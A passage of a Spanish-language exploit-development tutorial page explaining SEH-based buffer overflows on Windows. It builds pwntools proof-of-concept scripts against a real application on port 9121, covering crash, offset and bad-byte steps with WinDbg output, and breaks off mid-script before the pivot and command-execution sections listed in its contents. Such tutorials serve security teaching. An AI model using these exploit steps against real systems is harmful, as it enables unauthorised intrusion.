<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>SEH Overflow</title>

  <meta name="description" content="Explotación de Buffer Overflow basado en SEH">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SEH Overflow">
  <meta name="twitter:description" content="Explotación de Buffer Overflow basado en SEH">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-user/seh-overflow/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="SEH Overflow">
  <meta property="og:description" content="Explotación de Buffer Overflow basado en SEH">
  <meta property="og:image" content="/exploit-development/windows-user/seh-overflow/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-user/seh-overflow/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="SEH Overflow" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-user" title="xchg2pwn" class="blog-button">Windows User Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#theory">Theory</a></li>
        <li><a href="#crashing">Crashing Application</a></li>
        <li><a href="#offset">Find Offset</a></li>
        <li><a href="#badbytes">Find Badytes</a></li>
        <li><a href="#opcode">Find Opcode</a></li>
        <li><a href="#pivot">Stack Pivot</a></li>
        <li><a href="#commands">Execute Commands</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-user/seh-overflow/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">SEH Overflow</h2><br>
  </header>

<section class="post" id="index">
    <br><p class="plain-text">Además del <a href="/exploit-development/windows-user/stack-overflow">Stack Overflow</a>, hay más vulnerabilidades, en este caso analizaremos un <code class="language-plaintext highlighter-rouge">SEH Overflow</code> que ocurre cuando sobrescribimos la estructura de excepciones SEH, nuevamente utilizaremos la misma aplicación real para entender la explotación.</p>
</section>

<section class="post" id="theory">
<br><h3 class="post-title">Theory</h3><br>

<p class="plain-text">Iniciamos con algunos conceptos importantes a aprender para poder explotar esta vulnerabilidad, <code class="language-plaintext highlighter-rouge">SEH</code> o Structured Exception Handling es la forma que tiene Windows de manejar las <code class="language-plaintext highlighter-rouge">excepciones</code>, estas pueden ser de software o hardware, un ejemplo básico en código podria ser el tipico <code class="language-plaintext highlighter-rouge">try/catch</code> para manejar excepciones:</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">try</span><span class="p"> {
    </span><span class="c1">// code block to try to execute</span><span class="p">
} </span><span class="o">catch</span><span class="p"> {
    </span><span class="c1">// code block if causes an exception</span><span class="p">
}</span>
</code></pre></div></div><br>

<p class="plain-text">Algunos conceptos interesantes sobre este controlador de excepciones son:</p>
<p class="plain-text">• La estructura SEH es independiente por cada hilo en ejecución, esta consta de 2 valores, el controlador y el puntero a la siguiente estructura SEH.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION</span>
</code></pre></div></div><br>

<p class="plain-text">• El puntero a la estructura SEH se almacena en la estructura TEB y al ser el primer valor se puede acceder desde <code class="language-plaintext highlighter-rouge">fs:[0]</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!teb
TEB at 002bf000
    ExceptionList:        01d3ff60
    StackBase:            01d40000
    StackLimit:           01d3c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 002bf000
    EnvironmentPointer:   00000000
    ClientId:             00001918 . 00000f18
    RpcHandle:            00000000
    Tls Storage:          00000000
    PEB Address:          0029b000
    LastErrorValue:       0
    LastStatusValue:      0
    Count Owned Locks:    0
    HardErrorMode:        0

</span><span class="ro">0:000> </span><span class="p">dd fs:[0] L1
0053:00000000  01d3ff60</span>
</code></pre></div></div><br>

<p class="plain-text">• Un programa puede tener multiples controladores SEH y estos estan encadenados entre si por una lista creando una cadena.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ff60  
   +0x000 Next             : 0x01d3ffcc _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x7735af20     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ffcc  
   +0x000 Next             : 0x01d3ffe4 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x7735af20     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ffe4  
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77368c1d     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad45+0</span>
</code></pre></div></div><br>

<p class="plain-text">• Todas las cadenas terminan con un SEH predeterminado, el siguiente SEH apunta a <code class="language-plaintext highlighter-rouge">0xffffffff</code> que significa que es el ultimo de la cadena.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0x01d3ffe4
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77368c1d     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad45+0</span>
</code></pre></div></div><br>

<p class="plain-text">• Si se utiliza la flag <code class="language-plaintext highlighter-rouge">/SAFESEH</code> el programa no será vulnerable ya que usará un controlador seguro.</p>
<p class="plain-text">• Los programas en <code class="language-plaintext highlighter-rouge">x64</code> no son vulnerables a SEH Overflow ya que los archivos tienen controladores de excepciones seguros.</p>

<p class="plain-text">Resumiendo un poco lo anterior la estructura <code class="language-plaintext highlighter-rouge">SEH</code> de podria ver algo asi, donde una encadena a la otra almacenando el puntero al siguiente SEH terminando la cadena con el controlador por defecto que como siguiente SEH apunta a <code class="language-plaintext highlighter-rouge">0xffffffff</code>.</p>
<a href="/exploit-development/windows-user/seh-overflow/4.png" target="_blank"><div><p><img src="/exploit-development/windows-user/seh-overflow/4.png"></p></div></a>

<p class="plain-text">Para finalizar podemos usar el comando integrado en windbg <code class="language-plaintext highlighter-rouge">!exchain</code> para ver toda la estructura SEH, nos muestra los controladores y la estructura de forma recursiva.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
01d3ff60: ntdll!_except_handler4+0 (7735af20)
  CRT scope  0, filter: ntdll!DbgUiRemoteBreakin+3b (7738dbab)
                func:   ntdll!DbgUiRemoteBreakin+3f (7738dbaf)
01d3ffcc: ntdll!_except_handler4+0 (7735af20)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+3cb75 (773847a4)
                func:   ntdll!__RtlUserThreadStart+3cc0e (7738483d)
01d3ffe4: ntdll!FinalExceptionHandlerPad45+0 (77368c1d)
Invalid exception stack at ffffffff</span>
</code></pre></div></div><br>

</section>

<section class="post" id="crashing">
<br><h3 class="post-title">Crashing Application</h3><br>

<p class="plain-text">Nuevamente evitaremos la detección de la vulnerabilidad para ahorrar tiempo, por ahora usaremos un exploit de <code class="language-plaintext highlighter-rouge">exploitdb</code> para crear nuestro <code class="language-plaintext highlighter-rouge">poc</code>, resumiendo un poco para que el programa corrompa necesita un <code class="language-plaintext highlighter-rouge">header</code> bastante especifico.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">1000</span><span class="p">

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el poc pasa algo interesante y es que aunque el programa corrompe el <code class="language-plaintext highlighter-rouge">eip</code> no apunta a ninguna parte de nuestra cadena como pasa en un stack overflow.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to Windows on port 9121: Done
[</span><span class="az">*</span><span class="p">] Closed connection to Windows port 9121</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(d0c.18e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=006fff44 ebx=00000000 ecx=41414141 edx=00780000 esi=006fff08 edi=006fff08
eip=0099166a esp=006ffe00 ebp=006fff80 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_ConfigObj::Clear+0xa:
0099166a 8b410c          mov     eax,dword ptr [ecx+0Ch] ds:002b:4141414d=????????</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo lo que si sobrescribimos es la estructura <code class="language-plaintext highlighter-rouge">SEH</code> que ahora apunta a <code class="language-plaintext highlighter-rouge">0x41414141</code> tanto en el controlador como en el puntero al siguiente SEH.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
006ffe14: libpal!md5_starts+14783 (00a0d473)
006fff44: 41414141
Invalid exception stack at 41414141</span>
</code></pre></div></div><br>

<p class="plain-text">Como ha ocurrido una excepción y sobrescribimos el controlador este intentara saltar a la excepcion por lo que apuntara a <code class="language-plaintext highlighter-rouge">0x41414141</code> que si es parte de nuestra cadena.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:007> </span><span class="p">g
(d0c.18e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=77af8ac0 esi=00000000 edi=00000000
eip=41414141 esp=006ff850 ebp=006ff870 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
41414141 ??              ???</span>
</code></pre></div></div><br>

</section>

<section class="post" id="offset">
<br><h3 class="post-title">Find Offset</h3><br>

<p class="plain-text">Ahora necesitamos calcular la cantidad de bytes necesarios antes de sobrescribir los <code class="language-plaintext highlighter-rouge">2</code> valores de la estructura, el siguiente SEH y el controlador de la excepción, para ello podemos usar <code class="language-plaintext highlighter-rouge">cyclic</code> y crear un patrón de caracteres que nos ayudara a calcularlo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">1000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora cambiamos las <code class="language-plaintext highlighter-rouge">1000 A's</code> del payload por este patrón y enviamos el exploit.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, cyclic

payload </span><span class="o">= </span><span class="p">cyclic(</span><span class="mi">1000</span><span class="p">)

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando el programa corrompe, los valores de la estructura que se sobrescribieron ya no son <code class="language-plaintext highlighter-rouge">0x41414141</code> sino que son los caracteres que forman parte del patrón creado con <code class="language-plaintext highlighter-rouge">cyclic</code> y nos indicarán la cantidad de bytes antes de llegar a sobrescribirlos.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(3a98.23dc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=020af963 ebx=020af9c8 ecx=00000135 edx=00000302 esi=020afa10 edi=00000134
eip=00c0dcce esp=020af99c ebp=020afecc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_GetToken+0x4e:
00c0dcce 88042f          mov     byte ptr [edi+ebp],al      ds:002b:020b0000=??

</span><span class="ro">0:000> </span><span class="p">!exchain
020afe10: libpal!md5_starts+149fb (00c7d6eb)
020aff48: 62616168
Invalid exception stack at 62616167</span>
</code></pre></div></div><br>

<p class="plain-text">Para calcular el offset tomamos el valor del siguiente SEH y del controlador para así pasarselos a <code class="language-plaintext highlighter-rouge">cyclic -l</code>, este nos devuelve el offset de cada uno de los valores.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-l 0x62616167
124

</span><span class="ve">❯ cyclic </span><span class="p">-l 0x62616168
128</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro payload ahora enviará <code class="language-plaintext highlighter-rouge">124 A's</code> hasta antes de sobrescribir la estructura SEH, <code class="language-plaintext highlighter-rouge">4 B's</code> que serán el siguiente SEH y <code class="language-plaintext highlighter-rouge">4 C's</code> que serán el controlador, ademas de ello rellenamos con <code class="language-plaintext highlighter-rouge">D's</code> hasta llegar a <code class="language-plaintext highlighter-rouge">1000</code> bytes ya que en la mayoria de casos es necesario forzar que ocurra la excepción enviando una cantidad grande de bytes.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
seh </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000</span><span class="o"> - </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al enviar el exploit el programa corrompe pero ahora controlamos la estructura SEH con el siguiente SEH con el valor <code class="language-plaintext highlighter-rouge">0x42424242</code> y el controlador con <code class="language-plaintext highlighter-rouge">0x43434343</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1914.1074): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01bff944 ebx=01bff9c4 ecx=00000139 edx=00000302 esi=01bffa0c edi=00000138
eip=008fdcce esp=01bff998 ebp=01bffec8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libpal!SCA_GetToken+0x4e:
008fdcce 88042f          mov     byte ptr [edi+ebp],al      ds:002b:01c00000=??

</span><span class="ro">0:000> </span><span class="p">!exchain
01bffe0c: libpal!md5_starts+149fb (0096d6eb)
01bfff44: 43434343
Invalid exception stack at 42424242</span>
</code></pre></div></div><br>

<p class="plain-text">Si seguimos la ejecución, como ocurrió una excepción ejecutará el primer controlador del SEH y como lo hemos sobrescrito con <code class="language-plaintext highlighter-rouge">0x43434343</code> intentará llegar a esa dirección.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1914.1074): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=77af8ac0 esi=00000000 edi=00000000
eip=43434343 esp=01bff3e8 ebp=01bff408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
43434343 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Algo a tener en cuenta es que cuando ocurre la excepción los valores del SEH se mueven al <code class="language-plaintext highlighter-rouge">stack</code> parecido a cuando se llama a una función, lo que nos interesa es que en la dirección <code class="language-plaintext highlighter-rouge">esp + 8</code> se encuentra el puntero hacia el siguiente SEH.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
01bff3fc: ntdll!ExecuteHandler2+44 (77af8ac0)
01bffe0c: libpal!md5_starts+149fb (0096d6eb)
01bfff44: 43434343
Invalid exception stack at 42424242

</span><span class="ro">0:000> </span><span class="p">dds esp L4
01bff3e8  77af8aa2 ntdll!ExecuteHandler2+0x26
01bff3ec  01bff4e8 
01bff3f0  01bfff44                 </span><span class="c1">(esp + 8) [ptr to nseh]</span><span class="p">
01bff3f4  01bff538</span>
</code></pre></div></div><br>

<p class="plain-text">Al inspeccionar lo que hay en el puntero en <code class="language-plaintext highlighter-rouge">esp + 8</code> podemos ver el valor de la siguiente estructura SEH (<code class="language-plaintext highlighter-rouge">0x42424242</code>) seguido del controlador y las <code class="language-plaintext highlighter-rouge">D's</code> de relleno.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dds poi(esp + 8) L4
01bfff44  42424242                 </span><span class="c1">(nseh)</span><span class="p">
01bfff48  43434343                 </span><span class="c1">(seh)</span><span class="p">
01bfff4c  44444444                 </span><span class="c1">(DDDD)</span><span class="p">
01bfff50  44444444                 </span><span class="c1">(DDDD)</span>
</code></pre></div></div><br>

</section>

<section class="post" id="badbytes">
<br><h3 class="post-title">Find Badbytes</h3><br>

<p class="plain-text">Algo importante es detectar <code class="language-plaintext highlighter-rouge">bytes</code> que puedan dar problemas, ya que es posible que el programa tenga problemas con algunos caracteres especificos y cortar la cadena, si esto pasa en un shellcode eliminará muchas de las instrucciones y no se ejecutará.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">-q
>>> bytes(range(0, 256))
b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
>>></span>
</code></pre></div></div><br>

<p class="plain-text">Modificamos el exploit para que en lugar de guardar <code class="language-plaintext highlighter-rouge">D's</code> guarde nuestro bytearray con los <code class="language-plaintext highlighter-rouge">256</code> posibles caracteres para después comparar <code class="language-plaintext highlighter-rouge">256 bytes</code> de esa dirección de memoria con los bytes originalmente desde <code class="language-plaintext highlighter-rouge">0x00</code> hasta <code class="language-plaintext highlighter-rouge">0xff</code>, si uno de ellos se ve modificado o tiene un valor diferente significa que hubo algún problema.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
seh </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">4</span><span class="p">

badbytes </span><span class="o">= </span><span class="na">bytes</span><span class="p">(</span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 256</span><span class="p">))

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">badbytes
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
